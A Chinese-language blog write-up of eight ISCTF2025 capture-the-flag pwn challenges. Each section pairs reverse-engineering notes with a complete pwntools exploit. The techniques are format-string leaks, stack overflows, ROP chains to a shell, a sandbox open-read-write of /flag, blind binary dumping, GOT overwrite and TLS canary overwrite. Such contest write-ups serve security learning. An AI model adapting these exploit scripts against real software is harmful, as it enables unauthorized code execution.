---
title: ISCTF2025-pwn WriteUp
date: 2025-12-05 12:17:00
tags: 
    - pwn
    - ISCTF2025
    - WriteUp
    - 整数溢出
    - 格式化字符串
    - stack
categories: Contest
---
## sign

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/sign/checksec.png)

保护全开，可能会有点棘手？

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/sign/main.png)

### 攻击思路

好吧，其实只是个简单的整型编码问题，，，

注意到 2916788906 (unsigned int) 的编码 与 -1378178390 (int) 的编码相同，均为 0xADDAAAAA ，所以往 `v[27]` 上写入 0xADDAAAAA 就可以拿到权限啦

### exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./sign')
pid = pidof(io)[0]

payload = b'A' * (27 * 4) + p64(2916788906)
io.sendline(payload)

io.interactive()
```

---

## ez_fmt

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezfmt/checksec.png)

开了 PIE 和 canary 欸？

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezfmt/vuln.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezfmt/win.png)

### 攻击思路

注意到有格式化字符串漏洞，故考虑第一次 read 直接泄露 PIE 和 canary ，，，

第二次 read 有明显的栈溢出漏洞，利用泄露出的 PIE 计算出后门函数 win 的地址，再构造 payload 把泄露出的 canary 放上去然后跳转到目标地址就行啦

### exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = process('./ez_fmt')

backdoor = 0x202
payload = b'%23$lx%25$lx'

io.recvuntil(b'input: ')
io.sendline(payload)

canary = p64(int(io.recv(16), 16))
addr = p64(int(io.recv(12), 16) // 0x1000 * 0x1000 + 0x202)
log.info(f'canary = {hex(u64(canary))}')
log.info(f'addr = {hex(u64(addr))}')

payload = b'a' * 0x88 + canary + b'a' * 8 + addr

io.recvuntil(b'input: ')
io.send(payload)

io.interactive()
```

---

## ret2rop

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ret2rop/checksec.png)

没啥保护喵，，，

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ret2rop/main.png)

这里 scanf 时不要输入 yes ，绕过没啥作用的 demo() ，

#### vuln

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ret2rop/vuln.png)

注意到 name 在 .bss 段上，这一点值得利用，且第二次 read 存在栈溢出漏洞，然而后面还有一个奇怪的异或处理，会影响写在栈上的数据，我们需要避开这个影响去构造 payload ，

#### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ret2rop/backdoor.png)

### 攻击思路

首先画出 vuln 的栈布局：

```
+-------------------+
|        ???        |   8 bytes
+-------------------+
|      ret_addr     |   8 bytes
+-------------------+
|        rbp        |   8 bytes
+-------------------+
|         i         |   8 bytes
+-------------------+
|         n         |   8 bytes
+-------------------+
|                   |
|        mask       |   32 bytes
|                   |
+-------------------+
|                   |
|        buf        |   32 bytes
|                   |
+-------------------+
```

注意到 n 对应 `buf[0x40]` ，在异或处理时会被 `mask[0x40]` 异或掉，而 `mask[0x40]` 对应 `buf[0x60]` ，即 ??? 处的数据，我们希望在异或操作影响到 ret_addr 前结束掉，只要修改 n 为 0 即可，那么 ??? 处的数据应该与 n 互补。
方便起见，我们不妨直接读入 0x100 字节令 n = 0x100 ，则令 ??? 处为 0xfffffffffffffeff 即可终止循环。

此外，由于 name 在 .bss 段上，我们可以写入 /bin/sh\x00 ，再利用已有 gadget 构造 rop 链到 `call _system` 处便可以轻松完成攻击。

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process('./ret2rop')

io.recvuntil(b'demo\n')
payload = b'\x00'
io.sendline(payload)

io.recvuntil(b'name\n')
payload = b'/bin/sh\x00'
io.sendline(payload)

bss_addr = p64(0x4040F0)
pop_rsi_ret = p64(0x401A1C)
mov_rdi_rsi_ret = p64(0x401A25)
backdoor = p64(0x401A39)
ret = p64(0x401C15)

io.recvuntil(b'yourself\n')
payload = b'\xFF' * (0x50 + 8) + pop_rsi_ret + p64(0xfffffffffffffeff) + pop_rsi_ret + bss_addr + mov_rdi_rsi_ret + ret + backdoor
payload = payload.ljust(0x100, b'\x00')
io.sendline(payload)

io.interactive()
```

---

## ez2048

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/checksec.png)

开了 canary ，喵呜？

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/main.png)

buf 在 .bss 段上，这一点可以被利用，，，

#### playgame

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/playgame.png)

按 q 时 `score -= 10` ，我们敏锐地预知到有整数溢出漏洞可以利用，，，

#### final

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/final.png)

果然有整数溢出漏洞啊，初始 `score = 50`，所以前面 playgame 直接故意 quit 六次就行了。

#### shell

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/shell.png)

有多次 read 的机会且存在栈溢出漏洞，，， canary 从 `buf[17]` 开始，根据 canary 最低 1 字节处为 \x00 的特征，我们可以构造 buf 去使 printf 能够泄露 canary 而不在中途被 \x00 截断。

```python
payload = b'A' * (17 * 8 - 1) + b'B' * 2
io.send(payload)

io.recvuntil('AAAAB')
canary = p64(u64(io.recv(8)) // 0x100 * 0x100)
```

#### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ez2048/backdoor.png)

太坏了，还要自己想办法读入 /bin/sh\x00 ，但是在 main 中读入到 buf 上就行啦。

### 攻击思路

其实上面已经讲的差不多了？

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process('./ez2048')

io.recvuntil('name\n')
name = b'/bin/sh\x00'
io.sendline(name)

io.recvuntil('game')
io.send(b'\n')

for i in range(6):
	io.recvuntil('points)\n')
	io.sendline(b'q')

	io.recvuntil('round\n')
	io.sendline(b'a')

io.recvuntil('points)\n')
io.sendline(b'q')
io.recvuntil('round\n')
io.sendline(b'q')

io.recvuntil('$ ')
payload = b'A' * (17 * 8 - 1) + b'B' * 2
io.send(payload)

io.recvuntil('AAAAB')
canary = p64(u64(io.recv(8)) // 0x100 * 0x100)
log.info(f'{hex(u64(canary))}')

pop_rdi_ret = p64(0x40133e)
sh = p64(0x404A46)
shell = p64(0x401355)

io.recvuntil(b'$ ')
payload = b'exit\x00' + b'A' * (17 * 8 - 5) + canary + b'A' * 8 + pop_rdi_ret + sh + shell
io.sendline(payload)

io.interactive()
```

---

## ez_stack

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/checksec.png)

吓哭了

### ropper

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/ropper.png)

？？？我 gadget 呢？？？

### IDA

打开 IDA 一看，函数名没有， C 伪代码没法读，有点绝望地去看了汇编，花了很多时间理清这个程序到底在干什么，，，然后给各个函数命名

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/main.png)

#### syscall

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/syscall.png)

原来系统调用号在 r9 里啊。。。。

#### readrdxbytes

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/readrdxbytes.png)

读取 rdx 字节的数据，遇到换行提前停止

#### mmap

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/mmap.png)

调用了 mmap syscall ，在 0x114514000 开了一页 rwx 区域，但只从 main 中得知只允许写入 16 字节，考虑拿来写缺少的 gadget 和字符串，

#### nosyscall

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/nosyscall.png)

rwx 区域 syscall の gadget 写入禁止，

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/exitofnosyscall.png)

有问题就无情地 exit ，

#### doyoulikegift

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/doyoulikegift.png)

泄露了 main 的地址，可用于绕过 PIE 保护
泄露了栈的地址，可用于在连续的 leave 指令下稳定 rbp 和 rsp

#### retaddrerror

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/retaddrerror.png)

栈溢出但防止返回地址被篡改，不过没关系，PIE 保护已经可以绕过了
感觉到这里已经可以完成攻击了？只要把 /bin/sh\x00 写到 0x114514000 区域就可以 ret2syscall 了吧？并非。

#### init_array

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/init-array.png)

这是什么鸭？初始化的时候调用了什么函数？

#### prctl

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/prctl1.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezstack/prctl2.png)

哇是沙箱，我们没救了，，，
拿到权限是不大可能了，因此考虑 orw ，把 /flag\x00\x00\x00 写到 0x114514000 区域，，，

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process('./baby_stack')

gadget = b'\x5F\xC3\x5E\xC3\x5A\xC3\x58\xC3'
flag_str = b'/flag\x00\x00\x00'
log.info(f'gadget = \n{disasm(gadget)}')

io.recvuntil(b'ISCTF2025!\n')
io.send(gadget + flag_str)

io.recvuntil(b'GIFT?\n')
main_addr = u64(io.recv(6).ljust(8, b'\x00'))
ret_addr = p64(main_addr // 0x100 * 0x100 + 0x9B)
syscall_addr = p64(main_addr // 0x1000 * 0x1000 + 0x175)
io.recvuntil(b'\n')
stack_addr = u64(io.recv(6).ljust(8, b'\x00'))
rbp_addr = p64(stack_addr - 0xa8 + 0xe0)
heap_top = p64(0x114514100)

log.info(f'main_addr = {hex(main_addr)}')
log.info(f'ret_addr = {hex(u64(ret_addr))}')
log.info(f'stack_addr = {hex(stack_addr)}')
log.info(f'rbp_addr = {hex(u64(rbp_addr))}')

pop_rdi_ret = p64(0x114514000)
pop_rsi_ret = p64(0x114514002)
pop_rdx_ret = p64(0x114514004)
pop_rax_ret = p64(0x114514006)
ret = p64(0x114514007)
flag_addr = p64(0x114514008)

payload = b'A' * 0x110 + rbp_addr + ret_addr + b'A' * 8

payload += pop_rdi_ret + flag_addr
payload += pop_rsi_ret + p64(0)
payload += pop_rax_ret + p64(2)
payload += syscall_addr + rbp_addr

payload += pop_rdi_ret + p64(3)
payload += pop_rsi_ret + heap_top
payload += pop_rdx_ret + p64(0x110)
payload += pop_rax_ret + p64(0)
payload += syscall_addr + rbp_addr

payload += pop_rdi_ret + p64(1)
payload += pop_rsi_ret + heap_top
payload += pop_rdx_ret + p64(0x110)
payload += pop_rax_ret + p64(1)
payload += syscall_addr

io.sendline(payload)

io.interactive()
```

---

## bad_box

复读机

### ？？？

不是哥们，我写盲打，真的假的？

### 输入测试

#### test1

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/test1.png)

没有格式化字符串漏洞

#### test2

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = remote('challenge.bluesharkinfo.com', 114514)

io.recvuntil(b'fun\n')
payload = b'A' * 0x1000 + b'\x00'
io.send(payload)
io.recvall()

io.interactive()
```

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/test2.png)

没有溢出？

#### test3

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = remote('challenge.bluesharkinfo.com', 114514)

io.recvuntil(b'fun\n')
payload = b'%p' * 0x1000 + b'\x00'
io.send(payload)
io.recvall()

io.interactive()
```

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/test3.png)

欸？有格式化字符串漏洞？？？

事实上，经验证，小于 32 字节的读入不使用格式化字符串输出（遇 \x00 不截断，很可能是 write ），大于 32 字节的读入才使用格式化字符串输出（遇 \x00 截断，很可能是 printf ）。

### stackleak

既然如此，我们考虑先看看栈上面有什么

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = remote('challenge.bluesharkinfo.com', 114514)

io.recvuntil(b'fun\n')
payload = b'%p\n' * 0x3A + b'\x00'
io.send(payload)
stack_addr = int(io.recvuntil('\n')[:-1], 16)
back = io.recvall()

lines = 0
strings = ''

for i in back.decode('utf-8'):
	strings += i
	if i == '\n':
		lines += 1
		log.info(f'{hex(stack_addr + lines * 8)} :    {strings}')
		strings = ''

io.interactive()
```

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/stack.png)

根据栈上泄露出的信息，可知 PIE 保护没有开启， canary 保护开启
然后呢？栈上好像没有什么可利用的点了？

### dump

既然如此，不如直接利用格式化字符串漏洞，遍历 0x400000~0x404000 使用 %s 把原程序 dump 下来吧

```python
from pwn import *

context.arch = 'amd64'

begin = 0x400000
offset = 0
leaked = 0

while leaked < 0x4000 - offset:
	try:
		io = remote('challenge.bluesharkinfo.com', 114514)
		io.recvuntil(b'fun\n')
		payload = b'%9$s\x00\x00\x00\x00'
		payload += p64(begin + leaked + offset)
		payload += b'\x00' * 0x20
		io.send(payload)
		leak = io.recvall()
	except:
		log.info(f'len:{leaked}\n')
		continue
	leaked += len(leak) + 1
	log.info(f'len:{leaked}\n{disasm(leak + b'\x00')}')
	io.close()
	l = open('leak.bin', 'ab')
	l.write(leak + b'\x00')
	l.close()

io.interactive()
```

PS: 这个 dump 程序效率有点低，，，每连接一次只 leak 到一个 \x00 边界，大概要跑一个小时吧，，，

### IDA

把 dump 下来的程序拖进 IDA 反编译

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/main.png)

和之前分析的差不多，，，
`exit(0)` 使劫持返回地址变得不可能，因此我们考虑劫持 got 表。

#### backdoor

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/backdoor.png)

#### got

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/badbox/got.png)

明显的劫持 got 表模板，，，

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = remote('challenge.bluesharkinfo.com', 114514)

io.recvuntil(b'fun\n')

backdoor = 0x40125B # 4199003
exit_got = p64(0x4033A0)

payload = b'%' + str(backdoor).encode() + b'c' # 9
payload += b'%10$ln'+ b'\x00' # 16
payload += exit_got
payload += b'\x00' * 0x20

io.send(payload)
io.interactive()
```

---

## heap?

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/checksec.png)

全开

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/main.png)

#### add

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/add.png)

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/delete.png)

#### show

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/show.png)

有格式化字符串漏洞

#### read_num

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/heap/read_num.png)

栈溢出

### 攻击思路

假堆题，利用格式化字符串漏洞泄露 canary ， pie ， libc 后用 one_gadget 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

libc = ELF('./libc.so.6')

io = process('./pwn')
pid = pidof(io)[0]
io = remote('challenge.bluesharkinfo.com', 29483)

io.recvuntil(b'> ')
io.sendline(b'1')
payload = b'AAB%7$p\nAAB%9$p\nAAB%13$p\n'
io.sendline(str(len(payload)).encode())
io.sendline(payload)

io.recvuntil(b'> ')
io.sendline(b'3')
io.sendline(b'0')

io.recvuntil(b'AAB')
canary = p64(int(io.recv(18).decode('utf-8'), 16))
io.recvuntil(b'AAB')
pie_base = int(io.recv(14).decode('utf-8'), 16) - 0x16e7
io.recvuntil(b'AAB')
libc_leak = int(io.recv(14).decode('utf-8'), 16)
__libc_start_main = libc.symbols['__libc_start_main']
libc_base = libc_leak + 0x30 - __libc_start_main
log.info(f'canary = {hex(u64(canary))}')
log.info(f'pie_base = {hex(pie_base)}')
log.info(f'libc_base = {hex(libc_base)}')

one_gadget = p64(libc_base + 0xebc88)
bss_addr = p64(pie_base + 0x4300)

io.recvuntil(b'> ')
io.sendline(b'2')
payload = b'A' * (0x10 + 6) + canary + bss_addr + one_gadget
io.send(str(len(payload)).encode())
io.send(payload)

io.interactive()
```

---

## ezcanary

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezcanary/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezcanary/main.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezcanary/vuln.png)

溢出长度够长

### one_gadget

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezcanary/one_gadget.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/ISCTF-2025/ezcanary/reg_status.png)

### 攻击思路

溢出到 TLS 覆盖 canary 即可，然后 ret2libc + one_gadget

### exp

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

io = remote('challenge.bluesharkinfo.com', 23249)

io.recvuntil(b'>>\n')
payload = b'A' * (0x158 - 1) + b'B' * 1
io.send(payload)

io.recvuntil(b'AAAAB')
pthread_create = libc.symbols['pthread_create']
libc_pthread_create_sub_17d = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = libc_pthread_create_sub_17d - pthread_create + 0x17d
log.info(f'libc_base = {hex(libc_base)}')

one_gadget = p64(libc_base + 0xebc85)

io.recvuntil(b'>>\n')
payload = b'A' * 0x110 + p64(0x404300) + one_gadget + b'A' * (0x908 - 0x118) + p64(0x404600)
payload += b'A' * (0x1000 - len(payload))
io.send(payload)

io.interactive()
```